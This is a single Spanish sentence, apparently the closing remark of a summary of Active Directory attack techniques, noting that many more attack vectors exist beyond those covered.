Hay muchos mas vectores de ataques, pero esto es una forma resumida de las principales tecnicas que se suelen utilizar para entornos reales en `Active Directory`
